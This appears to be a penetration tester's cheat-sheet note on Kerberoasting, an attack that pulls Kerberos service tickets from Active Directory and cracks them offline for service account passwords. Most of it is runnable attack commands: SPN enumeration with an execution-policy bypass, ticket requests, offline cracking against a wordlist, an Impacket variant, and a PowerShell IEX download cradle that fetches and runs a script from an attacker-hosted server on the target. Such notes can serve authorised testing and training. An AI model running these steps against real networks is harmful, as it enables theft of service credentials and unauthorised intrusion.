---
tags: [tool, privesc, windows, kerberos]
tool: "kerberoast"
category: "Privesc"
installed: true
phase: [ad, post-exploit]
---

# Kerberoast - Kerberos Service Account Attack

## Tool Overview
Purpose: Tools for extracting service account credentials via Kerberos
Location: /usr/share/kerberoast/

## What is Kerberoasting?
Kerberoasting is an attack that requests service tickets for accounts with SPNs
and cracks them offline to get service account passwords.

## Included Tools
- GetUserSPNs.ps1 - PowerShell script to enumerate SPNs
- kerberoast.py - Python implementation
- Various wordlists and cracking utilities

## How to Use

Enumerate SPNs with PowerShell:
powershell -ep bypass
. /usr/share/kerberoast/GetUserSPNs.ps1
GetUserSPNs

Request Tickets (PowerShell):
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql.domain.local"

Extract Tickets:
klist

Convert to Hash Format:
/usr/share/kerberoast/tgsrepcrack.py /usr/share/wordlists/rockyou.txt ticket.kirbi

Using Impacket (Alternative):
GetUserSPNs.py domain.local/user:pass -dc-ip DC_IP -request

Transfer to Target:
On Kali: cd /usr/share/kerberoast && python3 -m http.server 8000
On target: powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP:8000/GetUserSPNs.ps1'); GetUserSPNs"
